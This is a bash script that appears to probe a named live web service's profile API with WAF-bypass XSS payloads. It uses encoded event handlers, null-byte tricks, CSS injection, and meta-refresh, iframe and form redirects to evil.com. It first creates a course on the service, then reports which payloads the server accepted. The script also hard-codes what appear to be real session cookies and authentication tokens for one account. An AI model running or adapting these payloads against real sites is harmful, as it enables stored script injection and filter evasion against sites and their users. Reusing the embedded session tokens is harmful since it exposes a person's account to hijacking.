#!/bin/bash
# WAF Bypass Test Script for Cloud Studio XSS

COOKIE="AUTH_SESSION_ID=c4e095c3-ccbd-4564-b010-98c426fbf9d4.cs-keycloak-5569b7db68-2t4gn; KEYCLOAK_IDENTITY=eyJhbGciOiJIUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICI2ZTI2NDcxMy01YTE5LTRiYmQtOWViYy1iZWFhZmYyMjYwNTAifQ.eyJleHAiOjE4MTg4Nzk3ODIsImlhdCI6MTc4NzM0Mzc4MiwianRpIjoiMDhmN2JlZWYtZDhiMy00ZjMwLThjMGQtYjZkNDVkNTgzM2QzIiwiaXNzIjoiaHR0cHM6Ly9jbG91ZHN0dWRpby5uZXQvYXV0aC9yZWFsbXMvY2xvdWRzdHVkaW8iLCJzdWIiOiI4YjhiNzQ2ZS05MDVkLTQxNDEtOTkyYy03MDRjNTlmYzdmMTgiLCJ0eXAiOiJTZXJpYWxpemVkLUlEIiwic2Vzc2lvbl9zdGF0ZSI6ImM0ZTA5NWMzLWNjYmQtNDU2NC1iMDEwLTk4YzQyNmZiZjlkNCIsInN0YXRlX2NoZWNrZXIiOiJEQVItbEF3NTFRX2pudEhBSEJmU25FcTR2RFZiZmlOQUQ3R0xjenpVMXVNIn0._kDv5s1b2n7eqgrt0ye_FKpQ_DSFcsunqRTApUMuT-o; KEYCLOAK_IDENTITY_LEGACY=eyJhbGciOiJIUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICI2ZTI2NDcxMy01YTE5LTRiYmQtOWViYy1iZWFhZmYyMjYwNTAifQ.eyJleHAiOjE4MTg4Nzk3ODIsImlhdCI6MTc4NzM0Mzc4MiwianRpIjoiMDhmN2JlZWYtZDhiMy00ZjMwLThjMGQtYjZkNDVkNTgzM2QzIiwiaXNzIjoiaHR0cHM6Ly9jbG91ZHN0dWRpby5uZXQvYXV0aC9yZWFsbXMvY2xvdWRzdHVkaW8iLCJzdWIiOiI4YjhiNzQ2ZS05MDVkLTQxNDEtOTkyYy03MDRjNTlmYzdmMTgiLCJ0eXAiOiJTZXJpYWxpemVkLUlEIiwic2Vzc2lvbl9zdGF0ZSI6ImM0ZTA5NWMzLWNjYmQtNDU2NC1iMDEwLTk4YzQyNmZiZjlkNCIsInN0YXRlX2NoZWNrZXIiOiJEQVItbEF3NTFRX2pudEhBSEJmU25FcTR2RFZiZmlOQUQ3R0xjenpVMXVNIn0._kDv5s1b2n7eqgrt0ye_FKpQ_DSFcsunqRTApUMuT-o; KEYCLOAK_SESSION=cloudstudio/8b8b746e-905d-4141-992c-704c59fc7f18/c4e095c3-ccbd-4564-b010-98c426fbf9d4; cloudstudio-session=0b8666b3-3e38-480e-a97e-4f9db44e3a64.c4e095c3-ccbd-4564-b010-98c426fbf9d4.7875448c-33e2-4719-b43e-b41d499ab991; cloudstudio-session-team=wx; cloudstudio-name=%u4EC0%u4E48%u725B%u725B; key=11e62de2f4c0303a8f9e16d63210fd29c1f166d48140fe789209f02db560fd22"
XSRF="747453965"
API="https://cloudstudio.net/api/user/info"
TEACH_API="https://cloudstudio.net/api/teach-course/"

# Test counter
PASS=0
FAIL=0

test_payload() {
    local desc="$1"
    local payload="$2"
    local test_type="${3:-json}"
    
    echo "--- Testing: $desc ---"
    echo "Payload: $payload"
    
    if [ "$test_type" = "json" ]; then
        result=$(curl -s -X PATCH "$API" \
            -H 'Content-Type: application/json' \
            -H "x-xsrf-token: $XSRF" \
            -H 'x-requested-with: XMLHttpRequest' \
            -H "Cookie: $COOKIE" \
            -d "{\"introduction\":\"$payload\"}" 2>&1)
    elif [ "$test_type" = "multipart" ]; then
        result=$(curl -s -X PATCH "$API" \
            -H "x-xsrf-token: $XSRF" \
            -H 'x-requested-with: XMLHttpRequest' \
            -H "Cookie: $COOKIE" \
            -F "introduction=$payload" 2>&1)
    fi
    
    if echo "$result" | grep -q '"code":0'; then
        echo "✓ PASSED - Payload accepted!"
        PASS=$((PASS+1))
        echo "$result" | head -3
    elif echo "$result" | grep -q 'waf-captcha'; then
        echo "✗ BLOCKED by WAF"
        FAIL=$((FAIL+1))
    else
        echo "? UNKNOWN: $(echo "$result" | head -3)"
        FAIL=$((FAIL+1))
    fi
    echo ""
}

echo "============================================"
echo " WAF Bypass Tests - Course API (title)"
echo "============================================"
echo ""

# First create a course to test with
course_result=$(curl -s -X POST "$TEACH_API" \
    -H 'Content-Type: application/json' \
    -H "x-xsrf-token: $XSRF" \
    -H 'x-requested-with: XMLHttpRequest' \
    -H "Cookie: $COOKIE" \
    -d '{"title":"WAF Bypass Test Course","description":"Test course for WAF bypass","visible":0,"publicStatus":1,"categoryIds":[],"tags":[]}')
course_id=$(echo "$course_result" | python3 -c "import sys,json; print(json.load(sys.stdin).get('data',{}).get('id',''))" 2>/dev/null)
echo "Created course ID: $course_id"
echo ""

# ====== WAF BYPASS TECHNIQUE 1: Unicode/HTML Entity Encoding ======
echo "=== 1. Unicode/HTML Entity Encoding ==="

# HTML entity encoded onerror
test_payload "HTML entity onerror" "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"
test_payload "HTML entity onerror (hex)" "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>"
test_payload "Unicode escaped onerror" "<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>"
test_payload "HTML entity alert" "<img src=x onerror=alert&#40;1&#41;>"
test_payload "Double encoding" "<img src=x onerror=%2561%256c%2565%2572%2574(1)>"

# ====== WAF BYPASS TECHNIQUE 2: Mixed Case / Alternative Event Handlers ======
echo "=== 2. Mixed Case / Alternative Event Handlers ==="
test_payload "Mixed case" "<img src=x OnError=alert(1)>"
test_payload "onfocus with autofocus" "<input onfocus=alert(1) autofocus>"
test_payload "onmouseover" "<img src=x onmouseover=alert(1)>"
test_payload "onload" "<body onload=alert(1)>"
test_payload "onload with svg" "<svg onload=alert(1)>"
test_payload "onerror with svg" "<svg onerror=alert(1)>"

# ====== WAF BYPASS TECHNIQUE 3: Mutation / Mangle ======
echo "=== 3. Mutation / Mangle ==="
test_payload "Tab/newline in tag" "<img src=x	onerror=alert(1)>"
test_payload "Null byte" "<scr%00ipt>alert(1)</scr%00ipt>"
test_payload "Null byte 2" "<scr\u0000ipt>alert(1)</scr\u0000ipt>"

# ====== WAF BYPASS TECHNIQUE 4: No script / alternative XSS ======
echo "=== 4. Non-script XSS Vectors ==="
test_payload "meta refresh" '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'
test_payload "meta refresh URL" '<meta http-equiv="refresh" content="0;url=http://evil.com">'
test_payload "iframe" '<iframe src="http://evil.com">'
test_payload "form action" '<form action="http://evil.com"><input type="submit"></form>'
test_payload "base href" '<base href="http://evil.com">'
test_payload "style tag" '<style>body{background:red}</style>'
test_payload "link tag" '<link rel="stylesheet" href="http://evil.com/style.css">'
test_payload "a tag with onclick" '<a href onclick=alert(1)>click</a>'
test_payload "details with ontoggle" '<details ontoggle=alert(1)>'
test_payload "object tag" '<object data="http://evil.com">'

# ====== WAF BYPASS TECHNIQUE 5: Content-Type Confusion ======
echo "=== 5. Content-Type Confusion (multipart) ==="
test_payload "multipart onerror" '<img src=x onerror=alert(1)>' "multipart"

# ====== WAF BYPASS TECHNIQUE 6: CSS Injection ======
echo "=== 6. CSS Injection ==="
test_payload "CSS background URL" '<div style="background:url(http://evil.com)">'
test_payload "CSS expression" '<div style="xss:expression(alert(1))">'
test_payload "CSS import" '<style>@import url("http://evil.com/style.css");</style>'

# ====== WAF BYPASS TECHNIQUE 7: Fragment / Hash ======
echo "=== 7. Fragment / Hash ==="
test_payload "javascript in href" '<a href="javascript:alert(1)">click</a>'
test_payload "javascript in iframe src" '<iframe src="javascript:alert(1)">'

# ====== WAF BYPASS TECHNIQUE 8: Template Literal / Function ======
echo "=== 8. Obfuscated JS ==="
test_payload "eval" '<img src=x onerror=eval("alert(1)")>'
test_payload "Function constructor" '<img src=x onerror=Function("alert(1)")()>'
test_payload "setTimeout" '<img src=x onerror=setTimeout("alert(1)")>'
test_payload "String.fromCharCode" '<img src=x onerror=alert(String.fromCharCode(49))>'

# ====== WAF BYPASS TECHNIQUE 9: WAF CAPTCHA bypass via browser fetch ======
echo "=== 9. Browser fetch tests (skip - will test via browser) ==="

# ====== WAF BYPASS TECHNIQUE 10: Race condition / chunked encoding ======
echo "=== 10. Chunked Transfer / Split Payload ==="
test_payload "img with onerror spaces" '<img src=x onerror = alert(1)>'
test_payload "img with onerror /" '<img src=x onerror=alert(1)//>'
test_payload "onerror with backtick" '<img src=x onerror=alert`1`>'

echo ""
echo "============================================"
echo " Results: $PASS passed, $FAIL blocked/unknown"
echo "============================================"